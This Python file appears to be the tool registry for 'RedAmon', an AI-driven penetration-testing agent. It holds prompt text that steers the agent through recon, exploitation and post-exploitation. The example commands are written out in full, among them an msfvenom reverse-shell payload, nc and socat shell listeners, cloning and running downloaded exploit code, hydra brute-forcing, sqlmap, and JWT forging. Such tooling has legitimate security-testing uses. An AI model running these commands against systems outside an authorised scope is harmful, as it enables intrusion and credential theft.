"""
RedAmon Tool Registry

Single source of truth for tool metadata used by dynamic prompt builders.
Dict insertion order defines tool priority (first = highest).
"""

TOOL_REGISTRY = {
    "query_graph": {
        "purpose": "Neo4j database queries",
        "when_to_use": "PRIMARY - Check graph first for recon data",
        "args_format": '"question": "natural language question about the graph data"',
        "description": (
            '**query_graph** (PRIMARY - Preferred starting point)\n'
            '   - Query Neo4j graph database using natural language\n'
            '   - This is your PRIMARY source of truth for reconnaissance data\n'
            '   - **Contains:**\n'
            '     - **Assets:** Domains, Subdomains, IPs, Ports, Services, BaseURLs, DNSRecords\n'
            '     - **Web:** Endpoints, Parameters, Certificates, Headers\n'
            '     - **Intelligence:** Technologies, Vulnerabilities, CVEs, MitreData (CWE), CAPEC attack patterns\n'
            '     - **Network:** Traceroute hops\n'
            '     - **Exploits:** Exploit results (agent), ExploitGvm (scanner-confirmed)\n'
            '     - **GitHub Secrets:** GithubHunt, Repositories, Paths, Secrets (API keys, credentials), SensitiveFiles (.env, configs)\n'
            '   - Skip if you already know you need a specific tool (e.g., direct nmap scan, curl probe)\n'
            '   - Example: "Show all critical vulnerabilities for this project"\n'
            '   - Example: "What ports are open on 10.0.0.5?"\n'
            '   - Example: "What technologies are running on the target?"\n'
            '   - Example: "What GitHub secrets were found for this project?"\n'
            '   - Example: "Show all endpoints and parameters for target.com"'
        ),
    },
    "web_search": {
        "purpose": "Web search (Tavily)",
        "when_to_use": "Research CVEs, exploits, service vulns",
        "args_format": '"query": "search query for CVE details, exploit techniques, etc."',
        "description": (
            '**web_search** (SECONDARY - Research from the web)\n'
            '   - Search the internet for security research information via Tavily\n'
            '   - Use AFTER query_graph when you need external context not in the graph\n'
            '   - **USE FOR:** CVE details, exploit PoCs, version-specific vulnerabilities, attack techniques\n'
            '   - **USE FOR:** Metasploit module documentation, security advisories, vendor bulletins\n'
            '   - **DO NOT USE AS:** A replacement for query_graph (graph has project-specific recon data)\n'
            '   - Example args: "CVE-2021-41773 Apache path traversal exploit PoC"\n'
            '   - Example args: "Apache 2.4.49 known vulnerabilities"\n'
            '   - Example args: "Metasploit module for CVE-2021-44228 log4shell"'
        ),
    },
    "execute_nuclei": {
        "purpose": "CVE verification & exploitation",
        "when_to_use": "Verify/exploit CVEs using nuclei templates",
        "args_format": '"args": "nuclei arguments without \'nuclei\' prefix"',
        "description": (
            '**execute_nuclei** (CVE Verification & Exploitation)\n'
            '   - YAML-based vulnerability scanner with 8000+ community templates\n'
            '   - **PRIMARY USE:** Verify if a target is vulnerable to a specific CVE\n'
            '   - **SECONDARY USE:** Detect vulnerabilities by category (rce, sqli, xss, lfi, etc.)\n'
            '   - Can verify AND exploit many CVEs in one step\n'
            '   - Example args: "-u http://target -id CVE-2021-41773 -jsonl" (check specific CVE)\n'
            '   - Example args: "-u http://target -tags cve,rce -severity critical,high -jsonl" (find RCE CVEs)\n'
            '   - Example args: "-u http://target -jsonl" (full scan with all templates)'
        ),
    },
    "execute_curl": {
        "purpose": "HTTP reachability checks",
        "when_to_use": "Check if a web service is reachable, inspect HTTP headers/status",
        "args_format": '"args": "curl command arguments without \'curl\' prefix"',
        "description": (
            '**execute_curl** (HTTP Reachability Checks)\n'
            '   - Make HTTP requests to targets\n'
            '   - **USE FOR:** Reachability checks, HTTP status codes, response headers, banner identification\n'
            '   - **DO NOT USE FOR:** Vulnerability probing or exploitation — use execute_nuclei instead\n'
            '   - Example args: "-s -I http://target.com" (check headers)\n'
            '   - Example args: "-s http://target.com" (verify service responds)\n'
            '   - Example args: "-s -o /dev/null -w \'%{{http_code}}\' http://target.com" (check status code)'
        ),
    },
    "execute_naabu": {
        "purpose": "Port scanning",
        "when_to_use": "ONLY to verify ports or scan new targets",
        "args_format": '"args": "naabu arguments without \'naabu\' prefix"',
        "description": (
            '**execute_naabu** (Auxiliary - for verification)\n'
            '   - Fast port scanner for verification\n'
            '   - Use ONLY to verify ports are actually open or scan new targets not in graph\n'
            '   - Example args: "-host 10.0.0.5 -p 80,443,8080 -json"'
        ),
    },
    "execute_nmap": {
        "purpose": "Deep network scanning",
        "when_to_use": "Service detection, OS fingerprint, NSE scripts",
        "args_format": '"args": "nmap arguments without \'nmap\' prefix"',
        "description": (
            '**execute_nmap** (Deep scanning - service detection, OS fingerprint)\n'
            '   - Full nmap scanner for detailed service analysis\n'
            '   - Use when you need version detection (-sV), OS fingerprinting (-O), or NSE scripts (-sC)\n'
            '   - Slower than naabu but much more detailed\n'
            '   - Example args: "-sV -sC 10.0.0.5 -p 80,443"\n'
            '   - Example args: "-sV --script vuln 10.0.0.5"\n'
            '   - Example args: "-A 10.0.0.5 -p 22,80"'
        ),
    },
    "kali_shell": {
        "purpose": "General shell execution in Kali sandbox",
        "when_to_use": "Run shell commands, download PoCs, use Kali tools (NOT for writing code — use execute_code)",
        "args_format": '"command": "full shell command to execute"',
        "description": (
            '**kali_shell** (General Kali Shell Access)\n'
            '   - Full Kali Linux shell (bash -c). All standard Kali tools are available.\n'
            '   - **Timeout:** 120 seconds. For long-running tasks, use dedicated tools instead.\n'
            '   - **USE FOR:** Downloading PoCs (git clone), payload generation (msfvenom),\n'
            '     password cracking (john), SQL injection (sqlmap), vulnerability research (searchsploit),\n'
            '     reverse/bind shells (nc, socat, rlwrap), SMB enumeration (smbclient),\n'
            '     encoding, DNS lookups, SSH, running downloaded scripts,\n'
            '     and any Kali tool not exposed as a dedicated MCP tool.\n'
            '   - **Available CLI tools:**\n'
            '     - **Shells:** netcat (nc -e), socat (encrypted/PTY shells), rlwrap (readline for nc listeners)\n'
            '     - **Exploitation:** msfvenom (payload gen), searchsploit (exploit research), sqlmap (SQLi automation)\n'
            '     - **Post-exploitation:** john (password cracking), smbclient (SMB file ops), sshpass\n'
            '     - **Utilities:** jq (JSON parsing), git, wget, gcc/g++/make (compile C/C++ PoCs), perl\n'
            '   - **Pre-installed Python libraries** (available for one-liners via `python3 -c`):\n'
            '     requests, beautifulsoup4, pycryptodome, PyJWT, paramiko, impacket, pwntools\n'
            '     (For multi-line scripts, prefer **execute_code** to avoid shell escaping issues)\n'
            '   - **DO NOT USE FOR (use the dedicated MCP tool instead):**\n'
            '     - `curl` → use **execute_curl**\n'
            '     - `nmap` → use **execute_nmap**\n'
            '     - `naabu` → use **execute_naabu**\n'
            '     - `nuclei` → use **execute_nuclei**\n'
            '     - `msfconsole` → use **metasploit_console**\n'
            '     - Writing exploit scripts → use **execute_code**\n'
            '   - Example: "git clone https://github.com/user/CVE-PoC.git /tmp/poc && python3 /tmp/poc/exploit.py"\n'
            '   - Example: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell"\n'
            '   - Example: "john --wordlist=/usr/share/john/password.lst /tmp/hashes.txt"\n'
            '   - Example: "socat FILE:`tty`,raw,echo=0 TCP:TARGET:4444" (connect to bind shell with full TTY)\n'
            '   - Example: "rlwrap nc -lvnp 4444" (catch reverse shell with readline)\n'
            '   - Example: "sqlmap -u \'http://target/page?id=1\' --batch --dbs"\n'
            '   - Example: "searchsploit apache 2.4.49"'
        ),
    },
    "execute_code": {
        "purpose": "Execute code files (Python, bash, C, etc.)",
        "when_to_use": "Multi-line exploit scripts without shell escaping issues",
        "args_format": '"code": "source code", "language": "python", "filename": "exploit"',
        "description": (
            '**execute_code** (Code Execution — No Shell Escaping)\n'
            '   - Writes code to a file and executes with the appropriate interpreter.\n'
            '   - **Eliminates shell escaping** — code is passed as a clean string, no quoting needed.\n'
            '   - **USE FOR:** Multi-line Python exploit scripts, custom PoC code, payload generators,\n'
            '     deserialization exploits, any code longer than a simple one-liner.\n'
            '   - **DO NOT USE FOR:** Shell commands (use kali_shell), git clone, msfvenom, or non-code tasks.\n'
            '   - **Supported languages:** python (default), bash, ruby, perl, c, cpp\n'
            '   - **Timeout:** 120s execution. Compiled languages: 60s compile + 120s run.\n'
            '   - **Files persist** at /tmp/{filename}.{ext} — re-runnable via kali_shell if needed.\n'
            '   - **Pre-installed Python libraries** (import directly, no pip needed):\n'
            '     - **requests** — HTTP requests for web exploitation, API interaction, form submission\n'
            '     - **beautifulsoup4** (`from bs4 import BeautifulSoup`) — Parse HTML responses to extract tokens, forms, hidden fields, data\n'
            '     - **pycryptodome** (`from Crypto.Cipher import AES`, etc.) — Encrypt/decrypt payloads, hash manipulation, custom crypto attacks\n'
            '     - **PyJWT** (`import jwt`) — Forge/tamper/decode JWT tokens, algorithm confusion attacks (none/HS256/RS256)\n'
            '     - **paramiko** — Programmatic SSH sessions, SFTP file transfer, SSH tunneling for post-exploitation\n'
            '     - **impacket** — Windows/AD attacks: SMB relay, NTLM auth, Kerberos, secretsdump, psexec, wmiexec, dcomexec\n'
            '     - **pwntools** (`from pwn import *`) — Binary exploitation, remote TCP connections, shellcode generation, struct packing, ROP chains\n'
            '   - Example: code="import requests\\nr=requests.post(\'http://target/rce\', data={\'cmd\': \'id\'})\\nprint(r.text)"\n'
            '   - Example: code="import requests\\nfrom bs4 import BeautifulSoup\\nr=requests.get(\'http://target/login\')\\nsoup=BeautifulSoup(r.text,\'html.parser\')\\ntoken=soup.find(\'input\',{\'name\':\'csrf\'})\\nprint(token[\'value\'])"\n'
            '   - Example: code="import jwt\\ntoken=jwt.encode({\'user\':\'admin\',\'role\':\'admin\'},\'secret\',algorithm=\'HS256\')\\nprint(token)"\n'
            '   - Example: code="from impacket.smbconnection import SMBConnection\\nconn=SMBConnection(\'target\',\'target\')\\nconn.login(\'user\',\'pass\')\\nshares=conn.listShares()\\nfor s in shares:\\n  print(s[\'shi1_netname\'])"\n'
            '   - Example: code="from pwn import *\\nr=remote(\'target\',1337)\\nr.sendline(b\'payload\')\\nprint(r.recvall().decode())"'
        ),
    },
    "execute_hydra": {
        "purpose": "Brute force password cracking (50+ protocols)",
        "when_to_use": "Credential brute force attacks (SSH, FTP, SMB, RDP, HTTP, MySQL, etc.)",
        "args_format": '"args": "hydra arguments without \'hydra\' prefix"',
        "description": (
            '**execute_hydra** (Brute Force Password Cracking)\n'
            '   - THC Hydra — fast, parallelised network login cracker\n'
            '   - Stateless: runs, reports found credentials, and exits\n'
            '   - **50+ supported protocols:** ssh, ftp, rdp, smb, vnc, mysql, mssql, postgres,\n'
            '     redis, mongodb, telnet, pop3, imap, smtp, http-get, http-post-form, and more\n'
            '   - **Key flags:**\n'
            '     - `-l USER` / `-L FILE` — single username / username list\n'
            '     - `-p PASS` / `-P FILE` — single password / password list\n'
            '     - `-C FILE` — colon-separated `user:pass` combo file\n'
            '     - `-e nsr` — try null password (n), login-as-pass (s), reversed login (r)\n'
            '     - `-t TASKS` — parallel connections (default 16; SSH max 4, RDP max 1)\n'
            '     - `-f` — stop on first valid credential found\n'
            '     - `-s PORT` — non-default port\n'
            '     - `-S` — use SSL/TLS\n'
            '     - `-V` — verbose (show each attempt)\n'
            '   - **Syntax:** `[flags] protocol://target[:port]`\n'
            '   - **HTTP POST Form special syntax:** `[flags] target http-post-form "/path:params:F=failure_string"`\n'
            '     - Use `^USER^` and `^PASS^` as placeholders in form params\n'
            '   - Example: "-l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 -f -e nsr -V ssh://10.0.0.5"\n'
            '   - Example: "-l admin -P passwords.txt -f -V ftp://10.0.0.5"\n'
            '   - Example: "-l admin -P passwords.txt -f -V 10.0.0.5 http-post-form \\"/login:user=^USER^&pass=^PASS^:F=Invalid\\""'
        ),
    },
    "metasploit_console": {
        "purpose": "Exploit execution",
        "when_to_use": "Execute exploits, manage sessions",
        "args_format": '"command": "msfconsole command to execute"',
        "description": (
            '**metasploit_console** (Primary for exploitation)\n'
            '   - Execute Metasploit Framework commands\n'
            '   - Module context and sessions persist between calls\n'
            '   - **Chain commands with `;` (semicolons)**: `set RHOSTS 1.2.3.4; set RPORT 22; set USERNAME root`\n'
            '   - **DO NOT use `&&` or `||`** — these shell operators are NOT supported!\n'
            '   - Sessions persist across conversations — use msf_restart only if you need a clean state\n'
            '   - Simple system commands (curl, wget, python3) can be run directly in msfconsole\n'
            '   - **msfconsole Shell Limitations (CRITICAL):**\n'
            '     - NO variable assignment: `VAR=$(command)` does NOT work\n'
            '     - NO heredocs, NO subshell expansion `$(...)`\n'
            '     - Complex quoting breaks — use file-based approach instead:\n'
            '       `echo \'script\' > /opt/output/gen.py` then `python3 /opt/output/gen.py`\n'
            '     - If a command fails due to quoting: switch to file-based approach immediately'
        ),
    },
    "msf_restart": {
        "purpose": "Restart msfconsole",
        "when_to_use": "Reset Metasploit to a clean state (kills ALL sessions)",
        "args_format": '(no arguments)',
        "description": (
            '**msf_restart** (Metasploit full reset)\n'
            '   - Kills the msfconsole process and starts a fresh one\n'
            '   - **WARNING: Kills ALL active sessions and clears all module config**\n'
            '   - Use only when you need a completely clean Metasploit state\n'
            '   - Takes 60-120s to restart — do not use casually\n'
            '   - Do NOT use if there are active sessions you want to keep'
        ),
    },
}
